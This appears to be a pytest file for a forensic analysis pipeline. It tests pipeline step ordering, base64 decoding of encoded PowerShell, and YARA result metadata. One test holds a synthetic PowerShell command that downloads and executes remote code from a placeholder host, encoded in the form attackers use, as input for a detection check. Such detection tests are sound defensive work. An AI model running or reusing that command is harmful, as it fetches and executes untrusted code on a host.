from __future__ import annotations

import ast
import base64
import importlib
import json
import re
from pathlib import Path

import pytest


def _derived_after_raw_set() -> set[str]:
    text = Path("run_pipeline.py").read_text(errors="replace")
    match = re.search(r"_SLOT31C4_DERIVED_AFTER_RAW\s*=\s*(\{[^}]*\})", text)
    assert match, "_SLOT31C4_DERIVED_AFTER_RAW literal missing"
    value = ast.literal_eval(match.group(1))
    assert isinstance(value, set)
    return value


def test_decode_base64_strings_runs_in_step6c_after_raw_outputs() -> None:
    derived = _derived_after_raw_set()
    assert "extract_network_iocs" in derived
    assert "decode_base64_strings" in derived


def test_decode_base64_resolver_and_tool_decode_synthetic_powershell() -> None:
    import sift_sentinel.runtime.high_value_tool_args as hv
    from sift_sentinel.tools.decode_base64_strings import decode_base64_strings

    hv = importlib.reload(hv)

    payload = "IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/a')"
    encoded = base64.b64encode(payload.encode("utf-16le")).decode("ascii")
    tool_outputs = {
        "run_strings": {"output": ["ordinary string", encoded]},
        "parse_powershell_transcripts": {
            "output": [{"Command": "powershell -enc " + encoded}]
        },
    }

    resolved = hv.resolve_high_value_tool_invocation(
        "decode_base64_strings",
        tool_outputs=tool_outputs,
    )

    assert resolved is not None
    assert resolved["kind"] == "mcp_call"
    assert resolved["tool_name"] == "decode_base64_strings"
    assert "tool_outputs" in resolved["args"]

    result = decode_base64_strings(resolved["args"]["tool_outputs"])
    assert result["tool_name"] == "decode_base64_strings"
    assert result["record_count"] >= 1
    assert "DownloadString" in json.dumps(result)


def test_sift_native_yara_preserves_zero_result_metadata(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    import sift_sentinel.coordinator as c
    from sift_sentinel.tools import generic as gen

    c = importlib.reload(c)
    gen = importlib.reload(gen)
    c.new_tool_health()

    monkeypatch.setattr("shutil.which", lambda _name: "/usr/bin/yara")

    def fake_run_yara(rules_path: str, target_path: str) -> dict:
        return {
            "tool_name": "yara_scan",
            "execution_time_ms": 0,
            "evidence_path": target_path,
            "record_count": 0,
            "output": [],
            "rules_path": rules_path,
            "rules_file_count": 1,
            "rules_loaded_count": 1,
            "rules_loaded": True,
            "yara_rules_loaded_gate": "PASS",
            "yara_match_count": 0,
            "zero_result_meaning": "rules_loaded_no_matches",
        }

    monkeypatch.setattr(gen, "run_yara", fake_run_yara)

    result = c.run_tool(
        "run_yara",
        image_path=str(tmp_path / "memory.img"),
        disk_path=str(tmp_path / "disk.E01"),
    )

    assert result["tool_name"] == "run_yara"
    assert result["record_count"] == 0
    assert result["output"] == []
    assert result["rules_file_count"] == 1
    assert result["rules_loaded_count"] == 1
    assert result["rules_loaded"] is True
    assert result["yara_rules_loaded_gate"] == "PASS"
    assert result["yara_match_count"] == 0
    assert result["zero_result_meaning"] == "rules_loaded_no_matches"


def test_sift_native_pass_through_preserves_record_count_from_envelope(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    import sift_sentinel.coordinator as c
    from sift_sentinel.tools import generic as gen

    c = importlib.reload(c)
    gen = importlib.reload(gen)
    c.new_tool_health()

    monkeypatch.setattr("shutil.which", lambda _name: "/usr/bin/yara")

    def fake_run_yara(_rules_path: str, target_path: str) -> dict:
        return {
            "tool_name": "yara_scan",
            "evidence_path": target_path,
            "record_count": 2,
            "output": [{"rule": "A"}, {"rule": "B"}],
            "rules_file_count": 1,
            "rules_loaded_count": 1,
            "rules_loaded": True,
            "yara_rules_loaded_gate": "PASS",
            "yara_match_count": 2,
            "zero_result_meaning": "rules_loaded_matches_found",
        }

    monkeypatch.setattr(gen, "run_yara", fake_run_yara)

    result = c.run_tool(
        "run_yara",
        image_path=str(tmp_path / "memory.img"),
        disk_path=str(tmp_path / "disk.E01"),
    )

    assert result["record_count"] == 2
    assert result["yara_match_count"] == 2
    assert result["zero_result_meaning"] == "rules_loaded_matches_found"
